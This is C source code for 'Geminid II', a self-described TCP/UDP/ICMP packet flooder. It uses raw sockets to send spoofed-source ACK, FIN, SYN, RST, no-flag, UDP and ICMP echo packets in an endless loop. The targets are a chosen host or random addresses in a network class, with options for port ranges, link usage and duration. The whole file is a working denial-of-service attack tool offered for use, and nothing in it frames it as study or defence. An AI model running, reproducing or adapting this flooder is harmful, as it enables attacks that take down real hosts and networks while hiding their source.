#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>

#ifdef F_PASS
#include <sys/stat.h>
#endif

#include <netinet/in_systm.h>                                                   
#include <sys/socket.h>
#include <string.h>
#include <time.h>

#ifndef __USE_BSD
#   define __USE_BSD
#endif

#ifndef __FAVOR_BSD
#   define __FAVOR_BSD
#endif

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>


#ifdef LINUX
#   define FIX(x)  htons(x)
#else
#   define FIX(x)  (x)
#endif


/* Geminid attack flags */
#define TCP_ACK         1
#define TCP_FIN         2
#define TCP_SYN         4
#define TCP_RST         8
#define UDP_CFF        16
#define ICMP_ECHO_G    32
#define TCP_NOF        64 /* -N */

/* No flag attack */
#define TH_NOF         0x0

#define TCP_ATTACK()    (a_flags & TCP_ACK ||\
                         a_flags & TCP_FIN ||\
                         a_flags & TCP_SYN ||\
                         a_flags & TCP_RST ||\
                         a_flags & TCP_NOF)


#define UDP_ATTACK()    (a_flags & UDP_CFF)
#define ICMP_ATTACK()   (a_flags & ICMP_ECHO_G)


#define CHOOSE_DST_PORT() dst_sp == 0 ?\
                          random ()   :\
                          htons(dst_sp + (random() % (dst_ep -dst_sp +1)));


#define CHOOSE_SRC_PORT() src_sp == 0 ?\
                          random ()   :\
                          htons(src_sp + (random() % (src_ep -src_sp +1)));


#define SEND_PACKET()   if (sendto(rawsock,\
                                   &packet,\
                                   (sizeof packet),\
                                   0,\
                                   (struct sockaddr *)&target,\
                                    sizeof target) < 0) {\
                                        perror("sendto");\
                                        exit(-1);\
                        }



/* Linux / SunOS x86 / FreeBSD */
//#define BANNER_CKSUM 54018

/* SunOS Sparc */
#define BANNER_CKSUM 723


u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);                         
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);


u_long dstaddr;
u_short dst_sp, dst_ep, src_sp, src_ep;
char *src_class, *dst_class;
int a_flags, rawsock;
struct sockaddr_in target;

/* Self promotion :) */
const char *banner = "Geminid II. by live [TCP/UDP/ICMP Packet flooder]";

struct pseudo_hdr {         /* See RFC 793 Pseudo Header */
    u_long saddr, daddr;    /* source and dest address   */
    u_char mbz, ptcl;       /* zero and protocol         */
    u_short tcpl;           /* tcp length                */
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};


struct {
    int gv; /* Geminid value */
    int kv; /* Kernel value */
    void (*f)(u_char);
} a_list[] = {

        /* TCP */
    { TCP_ACK, TH_ACK, send_tcp },
    { TCP_FIN, TH_FIN, send_tcp },
    { TCP_SYN, TH_SYN, send_tcp },
    { TCP_RST, TH_RST, send_tcp },
    { TCP_NOF, TH_NOF, send_tcp }, /* No flag attack */

        /* UDP */
    { UDP_CFF, 0, send_udp }, 

        /* ICMP */
    { ICMP_ECHO_G, ICMP_ECHO, send_icmp },
    { 0, 0, (void *)NULL },
};


int
main(int argc, char *argv[])
{
    int n, i, on = 1;
    int b_link;
#ifdef F_PASS
    struct stat sb;
#endif
    unsigned int until;


    a_flags = dstaddr = i = 0;
    dst_sp = dst_ep = src_sp = src_ep = 0;
    until = b_link = -1;
    src_class = dst_class = NULL;
    while ( (n = getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) != -1) {
        char *p;

        switch (n) {
            case 'T': /* TCP attack 
                       *
                       * 0: ACK
                       * 1: FIN
                       * 2: RST
                       * 3: SYN
                       */

                switch (atoi(optarg)) {
                    case 0: a_flags |= TCP_ACK; break;
                    case 1: a_flags |= TCP_FIN; break;
                    case 2: a_flags |= TCP_RST; break;
                    case 3: a_flags |= TCP_SYN; break;
                }
                break;

            case 'U': /* UDP attack
                       */
                a_flags |= UDP_CFF;
                break;

            case 'I': /* ICMP attack
                       */
                a_flags |= ICMP_ECHO_G;
                break;

            case 'N': /* Bogus No flag attack (TCP)
                       */
                a_flags |= TCP_NOF;
                break;

            case 's':
                src_class = optarg;
                break;

            case 'h':
                dstaddr = lookup(optarg);    
                break;

            case 'd':
                dst_class = optarg;
                i = 1; /* neat flag to check command line later */
                break;

            case 'p':
                if ( (p = (char *) strchr(optarg, ',')) == NULL)
                    usage(argv[0]);
                dst_sp = atoi(optarg); /* Destination start port */
                dst_ep = atoi(p +1);   /* Destination end port */
                break;

            case 'q':
                if ( (p = (char *) strchr(optarg, ',')) == NULL)
                    usage(argv[0]);
                src_sp = atoi(optarg); /* Source start port */
                src_ep = atoi(p +1);   /* Source end port */
                break;

            case 'l':
                b_link = atoi(optarg);
                if (b_link <= 0 || b_link > 100)
                    usage(argv[0]);
                break;

            case 't':
                until = time(0) +atoi(optarg);
                break;

            default:
                usage(argv[0]);
                break;
        }
    }

    /* Checking command line */
    if ( (!dstaddr && !i) || 
         (dstaddr && i) ||
         (!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
         (src_sp != 0 && src_sp > src_ep) ||
         (dst_sp != 0 && dst_sp > dst_ep))
            usage(argv[0]);

    srandom(time(NULL) ^ getpid());

    /* Opening RAW socket */
    if ( (rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket");
        exit(-1);
    }

    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
        (char *)&on, sizeof(on)) < 0) {
            perror("setsockopt");
            exit(-1);
    }

    /* Filling target structure */
    target.sin_family           = AF_INET;

    /* Packeting! */
    for (n = 0; ; ) {

        /* Poor link control handling */
        if (b_link != -1 && random() % 100 +1 > b_link) {
            if (random() % 200 +1 > 199)
                usleep(1);
            continue;
        }

        /* Sending requested packets */
        for (i = 0; a_list[i].f != NULL; ++i) {
            if (a_list[i].gv & a_flags)
                a_list[i].f(a_list[i].kv);
        }         

        /* Attack is finished? Do not check it every time, would eat
         * too much CPU */
        if (n++ == 100) {
            if (until != -1 && time(0) >= until) break;
            n = 0;
        }
    }
                
    exit(0);
}


u_long
lookup(const char *host)
{
    struct hostent *hp;

    if ( (hp = gethostbyname(host)) == NULL) {
        perror("gethostbyname");
        exit(-1);
    }

    return *(u_long *)hp->h_addr;
}


#define RANDOM() (int) random() % 255 +1

char *
class2ip(const char *class)
{
    static char ip[16];
    int i, j;

    for (i = 0, j = 0; class[i] != '\0'; ++i)
        if (class[i] == '.')
            ++j;

    switch (j) {
        case 0:
            sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM());
            break;
        case 1:
            sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM());
            break;
        case 2:
            sprintf(ip, "%s.%d", class, RANDOM());
            break;

        /* Spoofing single host */
        default: strncpy(ip, class, 16);
                 break;
    }
    return ip;
}


unsigned short
in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    /*
     * Mop up an odd byte, if necessary
     */
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *)w;
        sum += answer;
    }

    /*
     * Add back carry outs from top 16 bits to low 16 bits
     */
    sum    = (sum >> 16) + (sum & 0xffff);  /* add hi 16 to low 16 */
    sum   += (sum >> 16);                   /* add carry           */
    answer = ~sum;                          /* truncate to 16 bits */

    return answer;
}


/*
 * Creating generic ip header, not yet ready to be used.
 */
static void
inject_iphdr(struct ip *ip, u_char p, u_char len)
{


    /* Filling IP header */
    ip->ip_hl             = 5;
    ip->ip_v              = 4;
    ip->ip_p              = p;
    ip->ip_tos            = 0x08; /* 0x08 */
    ip->ip_id             = random();
    ip->ip_len            = len;
    ip->ip_off            = 0;
    ip->ip_ttl            = 255;

    ip->ip_dst.s_addr     = dst_class != NULL ?
                            inet_addr(class2ip(dst_class)) :
                            dstaddr;

    ip->ip_src.s_addr     = src_class != NULL ? 
                            inet_addr(class2ip(src_class)) : 
                            random();

    /* I know, this is not part of the game, but anyway.. */
    target.sin_addr.s_addr = ip->ip_dst.s_addr;
}    


static void
send_tcp(u_char th_flags)
{
    struct cksum cksum;
    struct packet {
        struct ip ip;
        struct tcphdr tcp;
    } packet;


    /* Filling IP header */
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
    packet.ip.ip_sum        = in_cksum((void *)&packet.ip, 20);

    /* Filling cksum pseudo header */
    cksum.pseudo.daddr      = dstaddr;
    cksum.pseudo.mbz        = 0;
    cksum.pseudo.ptcl       = IPPROTO_TCP;
    cksum.pseudo.tcpl       = htons(sizeof(struct tcphdr));
    cksum.pseudo.saddr      = packet.ip.ip_src.s_addr;

    /* Filling TCP header */
    packet.tcp.th_flags     = 0;
    packet.tcp.th_win       = htons(65535);
    packet.tcp.th_seq       = random();
    packet.tcp.th_ack       = 0;
    packet.tcp.th_flags     = th_flags;
    packet.tcp.th_off       = 5; 
    packet.tcp.th_urp       = 0;
    packet.tcp.th_sport     = CHOOSE_SRC_PORT();
    packet.tcp.th_dport     = CHOOSE_DST_PORT();
    cksum.tcp               = packet.tcp;
    packet.tcp.th_sum       = in_cksum((void *)&cksum, sizeof(cksum));
    SEND_PACKET();
}


static void
send_udp(u_char garbage) /* No use for garbage here, just to remain */
{                        /* coherent with a_list[]                  */
    struct packet {
        struct ip ip;
        struct udphdr udp;
    } packet;


    /* Filling IP header */
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);

    /* Filling UDP header */
    packet.udp.uh_sport         = CHOOSE_SRC_PORT();
    packet.udp.uh_dport         = CHOOSE_DST_PORT();
    packet.udp.uh_ulen          = htons(sizeof packet.udp);
    packet.udp.uh_sum           = 0; /* No checksum */
    SEND_PACKET();
}


static void
send_icmp(u_char gargabe) /* Garbage discarded again.. */
{
    struct packet {
        struct ip ip;
        struct icmp icmp;
    } packet;


    /* Filling IP header */
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);

    /* Filling ICMP header */
    packet.icmp.icmp_type       = ICMP_ECHO;
    packet.icmp.icmp_code       = 0;
    packet.icmp.icmp_cksum      = htons( ~(ICMP_ECHO << 8));
    SEND_PACKET();
}


static void
usage(const char *argv0)
{
    printf("%s \n", banner);
    printf("Usage: %s [-T -U -I -N -s -h -d -p -q -l -t]\n\n", argv0);

printf("REGISTERED TO: seilaqm..\n\n");

printf("    -T TCP attack [0:ACK, 1:FIN, 2:RST, 3:SYN]   (no default         )\n");
printf("    -U UDP attack                                (no options         )\n");
printf("    -I ICMP attack                               (no options         )\n");
printf("    -N Bogus No flag attack                      (no options         )\n");
printf("    -s source class/ip                           (defaults to random )\n");
printf("    -h destination host/ip                       (no default         )\n");
printf("    -d destination class                         (no default         )\n");
printf("    -p destination port range [start,end]        (defaults to random )\n");
printf("    -q source port range [start,end]             (defaults to random )\n");
printf("    -l %% of box link to use                      (defaults to 100%%   )\n");
printf("    -t timeout                                   (defaults to forever)\n");


    exit(-1);
}
